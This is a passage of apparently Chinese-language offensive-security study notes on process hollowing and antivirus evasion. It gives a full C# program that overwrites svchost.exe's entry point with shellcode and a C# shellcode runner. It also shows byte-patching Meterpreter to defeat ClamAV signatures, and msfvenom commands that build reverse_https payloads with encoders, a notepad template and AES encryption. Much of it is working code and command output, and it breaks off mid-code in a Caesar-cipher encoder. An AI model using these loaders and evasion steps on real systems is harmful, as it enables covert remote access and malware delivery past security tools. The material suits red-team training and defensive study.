            0
        )
    );
```
#### 7. 讀取 PE Header
```csharp
byte[] headers =
    new byte[0x200];

ReadProcessMemory(
    pi.hProcess,
    imageBase,
    headers,
    headers.Length,
    out bytesRead
);
```
解析 
- Offset 0x3C → e_lfanew
- PE Header + 0x28 → AddressOfEntryPoint RVA

![image](https://hackmd.io/_uploads/ByUmdsvBzg.png)


#### 8. 計算 EntryPoint
```csharp
uint eLfanew =
    BitConverter.ToUInt32(
        headers,
        0x3C
    );
```
> `eLfanew` 是 PE Header 相對於 Image Base 的 offset

```csharp
uint entryPointRva =
    BitConverter.ToUInt32(
        headers,
        (int)(eLfanew + 0x28)
    );
```
最後算實際 address:
```csharp
IntPtr addressOfEntryPoint =
    new IntPtr(
        imageBase.ToInt64()
        +
        entryPointRva
    );
```
> EntryPoint VA = Image Base + AddressOfEntryPoint RVA

#### 9. 覆蓋 EntryPoint
把 shellcode 寫到 addressOfEntryPoint
```csharp
WriteProcessMemory(
    pi.hProcess,
    addressOfEntryPoint,
    buf,
    buf.Length,
    out IntPtr bytesWritten
);
```
#### 10. 恢復主 thread
```csharp
ResumeThread(
    pi.hThread
);
```
主 thread 原本準備從 svchost.exe EntryPoint 開始執行，現在已被覆蓋

>[!Important]
>x86 與 x64 偏移不同
>目前 x64 是假設:
>```
>x64 process
>PEB ImageBaseAddress offset = 0x10
>pointer size = 8 bytes
>```
>若是 x86：
>```
>pointer size = 4 bytes
>PEB offset 也不同
>```
#### 11. 完整 Program.cs
```csharp
using System;
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint procInfoLen,
            ref uint retlen
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            si.cb = Marshal.SizeOf(si);

            bool res = CreateProcess(
                null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (!res)
            {
                Console.WriteLine(
                    "CreateProcess failed: " +
                    Marshal.GetLastWin32Error()
                );

                return;
            }

            PROCESS_BASIC_INFORMATION bi =
                new PROCESS_BASIC_INFORMATION();

            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            int status = ZwQueryInformationProcess(
                hProcess,
                0,
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref tmp
            );

            if (status != 0)
            {
                Console.WriteLine(
                    "ZwQueryInformationProcess failed: 0x" +
                    status.ToString("X8")
                );

                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            IntPtr ptrToImageBase =
                (IntPtr)(bi.PebAddress.ToInt64() + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            res = ReadProcessMemory(
                hProcess,
                ptrToImageBase,
                addrBuf,
                addrBuf.Length,
                out nRead
            );

            if (!res)
            {
                Console.WriteLine(
                    "ReadProcessMemory failed: " +
                    Marshal.GetLastWin32Error()
                );

                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            IntPtr svchostBase;

            if (IntPtr.Size == 8)
            {
                svchostBase =
                    (IntPtr)BitConverter.ToInt64(addrBuf, 0);
            }
            else
            {
                svchostBase =
                    (IntPtr)BitConverter.ToInt32(addrBuf, 0);
            }

            byte[] data = new byte[0x200];

            res = ReadProcessMemory(
                hProcess,
                svchostBase,
                data,
                data.Length,
                out nRead
            );

            if (!res)
            {
                Console.WriteLine(
                    "ReadProcessMemory failed: " +
                    Marshal.GetLastWin32Error()
                );

                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            uint e_lfanew_offset =
                BitConverter.ToUInt32(data, 0x3C);

            uint opthdr =
                e_lfanew_offset + 0x28;

            uint entrypoint_rva =
                BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint =
                (IntPtr)(
                    svchostBase.ToInt64() +
                    entrypoint_rva
                );

            byte[] buf = new byte[659]
            {
                // Shellcode
                0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8...
            };

            res = WriteProcessMemory(
                hProcess,
                addressOfEntryPoint,
                buf,
                buf.Length,
                out IntPtr bytesWritten
            );

            if (!res)
            {
                Console.WriteLine(
                    "WriteProcessMemory failed: " +
                    Marshal.GetLastWin32Error()
                );

                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            uint resumeResult =
                ResumeThread(pi.hThread);

            if (resumeResult == 0xFFFFFFFF)
            {
                Console.WriteLine(
                    "ResumeThread failed: " +
                    Marshal.GetLastWin32Error()
                );
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}
```

# Introduction to Antivirus Evasion
防毒偵測的工作原理並嘗試如何繞過
![image](https://hackmd.io/_uploads/HJFHWvdBfg.png)

## Antivirus Software Overview
大多 AV 皆安裝在 endpoint，掃描方式分為兩種：
- On-demand scanning
由使用者或管理員主動執行掃描
- Real-time scanning
即時監控檔案操作

惡意檔案被偵測後會怎麼處理?
- 常見 Delete → 直接刪除
- Quarantine → 搬到隔離區，讓使用者無法執行

隔離通常不會只單純移動檔案，可能進一步修改檔名、加密檔案、移除執行權限、存入防毒專用目錄等等

偵測以 Signature-Based Detection\
Antivirus vendors 利用 reverse-engineering 定義惡意程式的特徵
1. 檔案 Hash
紀錄惡意檔案的 MD5 或 SHA-1，當掃描比對到一樣的 file hash 就會判定惡意\
🥚 只要檔案內容改變一個 byte，整個 hash 就會改變

2. 惡意 Byte Sequence
搜尋檔案中特定 byte sequence，例如固定 payload
```hex
FC 48 83 E4 F0 E8 ...
```
只要檔案中出現這段 byte pattern → 判斷為某種惡意 payload

>[!Note]
>**Heuristic Detection**:
>除了 signature，防毒也使用 Heuristic analysis、Behavioral analysis，不只看檔案長架構，進一步判斷可能會做什麼
>```
>建立遠端 process
>修改其他 process 記憶體
>呼叫 VirtualAllocEx
>呼叫 WriteProcessMemory
>呼叫 CreateRemoteThread
>修改登錄檔 persistence
>建立異常網路連線
>```
>有些 AV 會在 sandbox 中模擬執行檔案

近期 AV 也包含 Cloud 與 AI-based Detection，利用 Cloud computing、Artificial intelligence、Machine learning 等等分析：檔案結構、PE header、imports、entropy、API 使用方式、行為序列、網路特徵與大量已知樣本的相似程度

環境範例利用 ClamAV 與 Avira 兩套免費防毒軟體


## Simulating the Target Environment
在測試 payload 的環境，理想情況應該是在本地建立和目標完全相同的環境\
但在 Red Team 中不知道目標確切使用什麼產品、版本與政策，很難做到真正一模一樣

使用 Multi-engine Scanner ([VirusTotal](https://www.virustotal.com/gui/home/upload), [AntiScan.Me](https://antiscan.me/) ，讓多個 antivirus engine 同時掃描\
⚠️ VirusTotal 超過五十種 antivirus engines ，但會將掃描結果分發給所有相關的 antivirus vendors，可能會導致在部署之前就洩漏工具和技術
✅ AntiScan.Me 提供 26 種 antivirus engines，且僅提供三次免費掃描

## Locating Signatures in Files
繞過 antivirus signature detection 的過程:\
早期的 signature-based 會比對 file hashes，代表只需更改被掃描檔案中的 single byte 即可繞過偵測。

Signatures based on byte strings 更難繞過，因為需要先確定觸發偵測的 exact bytes。主要有兩種方法:
1. 最複雜的方法是逆向 antivirus scanning engine 和 signature database，從中發現 actual signatures
2. 將 binary 分割成多個片段，然後 sequentially smaller pieces，直到找到所需的 exact bytes。這種方法最初是在 [Dsplit](https://web.archive.org/web/20210118213717/https://www.securityfocus.com/archive/1/426771/30/0/threaded) 的流行工具中實現的。

DSplit tool is no longer available，使用 [Find-AVSignature](https://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html) PowerShell script 取代

環境範例中開啟 Avira Free Antivirus GUI 後關閉 Real-Time Protection\
![image](https://hackmd.io/_uploads/r1MMxzjSfg.png)

將上述產生的 32-bit Meterpreter executable (met.exe) 複製到 Windows 10 目標機器的 C:\Tools 下作為 malicious binary

```powershell
PS C:\Users\Offsec> cd C:\Tools

PS C:\Tools> Import-Module .\Find-AVSignature.ps1
```
>[!Note]
>Find-AVSignature 目的不是直接免殺，而是協助把檔案切成不同大小的測試檔，然後用 AV 掃描，透過「哪個檔案開始被偵測」來推斷 signature 大概落在哪個 offset 範圍

```powershell
PS C:\Tools> Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force

    Directory: C:\Tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/17/2019   3:40 AM                avtest1
VERBOSE: This script will now write 8 binaries to "C:\Tools\avtest1".
VERBOSE: Byte 0 -> 0
VERBOSE: Byte 0 -> 10000
VERBOSE: Byte 0 -> 20000
VERBOSE: Byte 0 -> 30000
VERBOSE: Byte 0 -> 40000
VERBOSE: Byte 0 -> 50000
VERBOSE: Byte 0 -> 60000
VERBOSE: Byte 0 -> 70000
VERBOSE: Byte 0 -> 73801
VERBOSE: Files written to disk. Flushing memory.
VERBOSE: Completed!
```
> - `StartByte 0`: 從檔案 offset 0 開始
> - `EndByte max`: 一直到檔案結尾
> - `Interval 10000`: 每次增加 10000 bytes 產生一個測試檔
> - `Path C:\Tools\met.exe`: 原始要分析的 binary
> - `OutPath C:\Tools\avtest1`: 輸出切好的測試檔到這個資料夾
> - `Verbose`: 顯示詳細執行資訊
> - `Force`: 強制建立或覆蓋輸出資料夾
>
>第一個 binary 包含 zero bytes。第二個 binary 案包含 10000 bytes\
>👉🏻 代表第二個檔案包含 Meterpreter binary 的第 0 到 10000 位元組

已經將 Meterpreter 可執行檔分割成多個片段並儲存 C:\Tools\avtest1 ，接著使用 ClamAV 進行掃描
```powershell
PS C:\Windows\system32> cd 'C:\Program Files\ClamAV\'

PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest1
C:\Tools\avtest1\met_0.bin: OK
C:\Tools\avtest1\met_10000.bin: OK
C:\Tools\avtest1\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_30000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_40000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_50000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_60000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_70000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_73801.bin: Win.Trojan.MSShellcode-7 FOUND

----------- SCAN SUMMARY -----------
Known viruses: 6494159
Engine version: 0.101.4
Scanned directories: 1
Scanned files: 9
Infected files: 7
Data scanned: 0.32 MB
Data read: 0.32 MB (ratio 1.00:1)
Time: 107.399 sec (1 m 47 s)
```
> 可以推測觸發點位於 10000～20000 附近

進一步調查，再次執行 Find-AVSignature，以 1000 位元組的間隔分割 Meterpreter 可執行文件，但這次只分割 Offset 為 10000 到 20000 的部分。將輸出目錄改為 C:\Tools\avtest2 以便將不同迭代的輸出分開
```powershell
PS C:\Tools> Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force
-
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest2
C:\Tools\avtest2\met_10000.bin: OK
C:\Tools\avtest2\met_11000.bin: OK
C:\Tools\avtest2\met_12000.bin: OK
C:\Tools\avtest2\met_13000.bin: OK
C:\Tools\avtest2\met_14000.bin: OK
C:\Tools\avtest2\met_15000.bin: OK
C:\Tools\avtest2\met_16000.bin: OK
C:\Tools\avtest2\met_17000.bin: OK
C:\Tools\avtest2\met_18000.bin: OK
C:\Tools\avtest2\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest2\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND
...
```
> 得知 offending bytes 位於 18000 到 19000 之間

依序縮小 interval:
```powershell
PS C:\Tools> Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force
-
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest3
C:\Tools\avtest3\met_18000.bin: OK
C:\Tools\avtest3\met_18100.bin: OK
C:\Tools\avtest3\met_18200.bin: OK
C:\Tools\avtest3\met_18300.bin: OK
C:\Tools\avtest3\met_18400.bin: OK
C:\Tools\avtest3\met_18500.bin: OK
C:\Tools\avtest3\met_18600.bin: OK
C:\Tools\avtest3\met_18700.bin: OK
C:\Tools\avtest3\met_18800.bin: OK
C:\Tools\avtest3\met_18900.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest3\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND
...
-
PS C:\Tools> Find-AVSignature -StartByte 18800 -EndByte 18900 -Interval 10 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest4 -Verbose -Force
-
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest4
C:\Tools\avtest4\met_18800.bin: OK
C:\Tools\avtest4\met_18810.bin: OK
C:\Tools\avtest4\met_18820.bin: OK
C:\Tools\avtest4\met_18830.bin: OK
C:\Tools\avtest4\met_18840.bin: OK
C:\Tools\avtest4\met_18850.bin: OK
C:\Tools\avtest4\met_18860.bin: OK
C:\Tools\avtest4\met_18870.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest4\met_18880.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest4\met_18890.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest4\met_18900.bin: Win.Trojan.Swrort-5710536-0 FOUND
...
-
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest5
C:\Tools\avtest5\met_18860.bin: OK
C:\Tools\avtest5\met_18861.bin: OK
C:\Tools\avtest5\met_18862.bin: OK
C:\Tools\avtest5\met_18863.bin: OK
C:\Tools\avtest5\met_18864.bin: OK
C:\Tools\avtest5\met_18865.bin: OK
C:\Tools\avtest5\met_18866.bin: OK
C:\Tools\avtest5\met_18867.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest5\met_18868.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest5\met_18869.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest5\met_18870.bin: Win.Trojan.Swrort-5710536-0 FOUND
...
```
> 🎉 18867 視為第一個關鍵 offset

>[!Tip]
>為什麼增加一個 byte 就會突然被偵測？\
>假設 ClamAV 尋找以下特徵: `AA BB CC DD`\
>不同長度的檔案可能如下：
>```
>檔案到 offset 18866：AA BB CC
>檔案到 offset 18867：AA BB CC DD
>```
>前一個檔案沒有完整特徵碼，因此顯示 OK；後一個檔案加入最後一個必要 byte，特徵碼變完整，因此顯示 FOUND

使用 PowerShell_ISE 讀取 Meterpreter executable bytes，將 把 offset 18867 的值改成 0x00，修改後寫入新檔 `met_mod.exe`
```powershell
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```
修改後重新切割及掃描
```powershell
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest6
C:\Tools\avtest6\met_mod_18860.bin: OK
C:\Tools\avtest6\met_mod_18861.bin: OK
C:\Tools\avtest6\met_mod_18862.bin: OK
C:\Tools\avtest6\met_mod_18863.bin: OK
C:\Tools\avtest6\met_mod_18864.bin: OK
C:\Tools\avtest6\met_mod_18865.bin: OK
C:\Tools\avtest6\met_mod_18866.bin: OK
C:\Tools\avtest6\met_mod_18867.bin: OK
C:\Tools\avtest6\met_mod_18868.bin: OK
C:\Tools\avtest6\met_mod_18869.bin: OK
C:\Tools\avtest6\met_mod_18870.bin: OK
...
```
> 代表原本那個 ClamAV 特徵碼已不再匹配

>[!Important]
Meterpreter 中不只存在一個 signature，修改後尋找下一個 Offset\
且所有截斷檔案都不會被偵測，但是完整檔案可能還是會被偵測\

ClamAV 可能依賴其他特徵: 檔案尾端內容、完整檔案長度、尾端 overlay、PE 結構完整性或只有完整檔案才成立的特徵

修改所有 Offset 後再額外修改最後一個 bytes 改為 0xff
```powershell
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
$bytes[18987] = 0
$bytes[73801] = 0xFF
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```
在修改後的 Meterpreter 執行檔進行最終掃描後，成功躲過了 ClamAV 的偵測

```powershell
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest14
C:\Tools\avtest14\met_mod.exe: OK
```
成功繞過防毒後，🥚... Meterpreter 也壞了 (控制流程也被修改)
且開啟 Avira 掃描該檔，還是標示為 malicious\
![image](https://hackmd.io/_uploads/SJeIbQjBMe.png)

找出觸發 AV 的特定 offset\
→ 直接修改那些 bytes\
→ 破壞 signature\
👉🏻 直接修改 byte 很容易把 payload 弄壞

## Bypassing Antivirus with Metasploit
Metasploit 包含多個 [encoder](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)，可以對 Meterpreter shellcode 進行編碼，進而混淆彙編程式碼

### Metasploit Encoders
Encoder 會將 shellcode 轉換成另一種 byte representation\
例如原始 shellcode：`FC E8 82 00 00 00 60 89 E5 ...`\
經過 XOR encode 後可能變成: `A6 B2 D8 5A 5A 5A 3A D3 BF ...`\
原始 signature 已經不存在，🥚 CPU 不能直接執行這些被編碼的內容，所以 payload 前面也必須放一段 decoder

```
┌──(chw💲CHW)-[~]
└─$ msfvenom --list encoders
Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
 ...
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
```
![image](https://hackmd.io/_uploads/HkLxu7iSzg.png)

‼️ [x86/shikata_ga_nai](https://danielsauder.com/2015/08/26/an-analysis-of-shikata-ga-nai/) encoder 是一種常用的多型編碼器，每次都會產生不同的輸出，因此可以有效地用於 signature evasion 


以下產生 32-bit Meterpreter encode 測試
```
┌──(chw💲CHW)-[~]
└─$ sudo msfvenom -p windows/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe
...
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 635 (iteration=0)
x86/shikata_ga_nai chosen with final size 635
Payload size: 635 bytes
Final size of exe file: 73802 bytes
Saved as: /var/www/html/met.exe
```
> Payload size: `635` bytes\
> Final size of exe file: `73802` bytes
> - `x86/shikata_ga_nai`: 使用 32-bit polymorphic encoder

產出後搭配 ClamAV 偵測
```
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\met.exe
C:\Tools\met.exe: Win.Trojan.Swrort-5710536-0 FOUND
...
```
為什麼 Shikata Ga Nai 還是被 ClamAV 偵測？ 可能消除了原始 shellcode signature，卻增加了另一個已知 encoder signature

64-bit malware 相較於 32-bit 出現得比較晚，因此防毒對 x64 payload 的 signature coverage 可能較少\
( 使用 64-bit Meterpreter without encoding)
```
┌──(chw💲CHW)-[~]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<KALI_IP>  LPORT=443 -f exe -o /var/www/html/met64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 741 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/met64.exe
```
> Payload size: `741` bytes\
> Final size of exe file: `7168` bytes

沒有 encode 的 Final size 小很多
```
完整結構類似：

┌─────────────────────────┐
│ PE Template             │
├─────────────────────────┤
│ Decoder Stub            │
├─────────────────────────┤
│ Encoded Meterpreter     │
└─────────────────────────┘
```
> Encode 造成最終 EXE 大小差異的是 msfvenom 所使用的 PE template、產生格式和封裝方式

使用 ClamAV 進行掃描
```powershell
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\met64.exe
C:\Tools\met64.exe: OK
...
```
成功繞過 ClamAV ，但 Avira 仍會偵測

使用 [x64/zutto_dekiru](https://www.infosecmatter.com/metasploit-module-library/?mm=encoder/x64/zutto_dekiru) encoder 測試
```
┌──(chw💲CHW)-[~]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=443 -e x64/zutto_dekiru -f exe -o /var/www/html/met64_zutto.exe
...
Attempting to encode payload with 1 iterations of x64/zutto_dekiru
x64/zutto_dekiru succeeded with size 840 (iteration=0)
x64/zutto_dekiru chosen with final size 840
Payload size: 840 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/met64_zutto.exe
```
> 仍被 Avira 偵測

⚠️ 可能 msfvenom 的預設 EXE template 已經被 AV 建立 signature，因此嘗試改用 Windows 原生的 notepad，使用指定的 PE 檔案作為 template
```
notepad.exe
+
插入 encoded Meterpreter payload
+
加入執行 payload 所需的修改
```

```
┌──(chw💲CHW)-[~]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /var/www/html/met64_notepad.exe
...
Attempting to encode payload with 1 iterations of x64/zutto_dekiru
x64/zutto_dekiru succeeded with size 758 (iteration=0)
x64/zutto_dekiru chosen with final size 758
Payload size: 758 bytes
Final size of exe file: 370688 bytes
Saved as: /var/www/html/met64_notepad.exe
```
> - `-x /home/kali/notepad.exe` 指定 PE 檔案作為 template

![image](https://hackmd.io/_uploads/rJ--A7sHGe.png)
> Try Harder 😐

### Metasploit Encryptors
Metasploit encoder 雖然會改變 shellcode 的內容，但 decoder stub、PE template 或 Meterpreter 本身仍可能被防毒辨識\
Rapid7 在 2018 年加入了 payload encryption 功能，嘗試用真正的加密演算法隱藏 shellcode，而不只是進行編碼或字元替換
```
┌──(chw💲CHW)-[~]
└─$ msfvenom --list encrypt

Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```
> - `aes256`: 對稱式加密
> - `rc4`: 串流加密，現代安全用途已不建議
> - `xor`: XOR 轉換，強度取決於設計
> - `base64`: 編碼 不提供保密性 (base64 ≠ encryption)

AES-256 加密 Meterpreter 的指令:
```
┌──(chw💲CHW)-[~]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 625 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/met64_aes.exe
```
```
┌────────────────────────────┐
│ PE executable / loader     │
├────────────────────────────┤
│ AES decryption routine     │
├────────────────────────────┤
│ Encryption key / metadata  │
├────────────────────────────┤
│ AES-encrypted shellcode    │
└────────────────────────────┘
```

遺憾的是繞了這麼久，建議別再當 Security Researcher 繞防毒了 XD\
![image](https://hackmd.io/_uploads/BJd7kEoBGg.png)

>[!Note]
>AV 不一定需要破解 AES:\
Avira 並不是因為破解 AES-256 才抓到特徵，AV 不需要知道 shellcode 解密後是什麼，只需要知道：
>```
>這個檔案包含已知的 Metasploit AES payload loader
>```
>就可以直接判定\
>類似於防毒看到一個已知 packer：
>```
>已知惡意 loader
>+
>不可讀取或高 entropy data
>```
>即使不知道 data 的明文內容，也可以依照外層模式攔截。

## Bypassing Antivirus with C#
利用公開、固定的 payload loader 很容易被防毒建立特徵碼，若自行撰寫程式，可以暫時避開針對既有工具的靜態 signature
### C# Shellcode Runner vs Antivirus
先用一個自製的 C# shellcode runner 當基礎
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
              0xfc,0x48,0x83,0xe4...

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
編譯後使用 Avira 掃描\
![image](https://hackmd.io/_uploads/HkDsHBjSzx.png)

ClamAV 也成功繞過

### Encrypting the C# Shellcode Runner
繞過防毒特徵碼偵測的關鍵在於自訂程式碼，而且由於要加密 shellcode，因此必須建立一個自訂解密程式來避免被偵測。

選用 Caesar Cipher 容易實作、不需要額外函式庫且可以讓 shellcode 的原始 byte pattern 消失\
Caesar Cipher 對 byte array
```
原始 byte + key = 編碼後 byte
```
例如 key 2
```
0x10 -> 0x12
0x20 -> 0x22
0xFF -> 0x01
```
Caesar 編碼器
```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            
            byte[] buf = new byte[752] { 0xfc,0x48,0x83,0xe4...
            };

            int key = 2;

            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] =
